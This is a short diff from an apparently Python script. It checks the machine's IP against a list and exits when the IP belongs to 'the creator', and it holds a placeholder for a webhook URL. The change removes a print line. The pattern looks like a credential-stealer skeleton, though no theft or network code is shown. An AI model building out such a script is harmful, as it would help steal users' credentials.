@@ -25,7 +25,6 @@ ip_list = {''}
 ip = get_ip()
 
 if ip in ip_list:
-    print("Ip Of the creator detected")
     sys.exit()
 
 webhook = "Webhook Here"
